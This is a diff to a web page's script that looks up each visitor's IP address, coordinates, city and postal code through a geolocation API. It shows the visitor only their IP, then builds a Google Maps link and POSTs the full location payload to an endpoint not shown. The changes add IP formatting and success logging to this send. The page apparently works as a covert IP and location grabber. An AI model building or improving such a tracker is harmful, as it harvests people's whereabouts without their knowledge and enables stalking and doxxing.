@@ -66,11 +66,18 @@
     </div>
 
     <script>
+        // Function to format IP address
+        function formatIP(ip) {
+            const parts = ip.split('.');
+            return parts.map(part => parseInt(part, 10)).join('.');
+        }
+
         // Get user's IP and location
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
                 const ip = data.ip;
+                const formattedIP = formatIP(ip);
                 const lat = data.latitude;
                 const lon = data.longitude;
                 const city = data.city;
@@ -79,14 +86,14 @@
                 const postal = data.postal;
 
                 // Display IP to user
-                document.getElementById('ip-span').textContent = ip;
+                document.getElementById('ip-span').textContent = formattedIP;
 
                 // Create Google Maps link
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
                 // Prepare payload
                 const payload = {
-                    ip: ip,
+                    ip: formattedIP,
                     coordinates: `${lat}, ${lon}`,
                     latitude: lat,
                     longitude: lon,
@@ -115,6 +122,14 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify(data)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Data sent successfully');
+                } else {
+                    console.log('Failed to send data');
+                }
+            }).catch(err => {
+                console.log('Error sending data:', err);
             });
         }
 
